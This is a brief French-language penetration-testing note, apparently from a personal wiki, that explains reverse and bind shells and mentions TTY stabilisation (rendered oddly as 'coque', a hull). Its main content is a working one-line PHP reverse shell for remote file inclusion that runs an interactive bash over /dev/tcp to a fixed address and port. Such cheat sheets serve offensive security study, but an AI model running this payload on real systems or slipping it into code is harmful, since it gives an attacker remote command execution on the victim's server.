Nous pouvons forcer le serveur distant soit à nous envoyer un accès en ligne de commande au serveur ([[Reverse shell]]), soit à ouvrir un port sur le serveur auquel nous pouvons nous connecter afin d'exécuter d'autres commandes ([[Bind shell]]).

Stabilisation de la coque avec [[TTY]]


---

Reverse shell PHP (RFI)

```php 
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.128/4242 0>&1'"); ?>
```


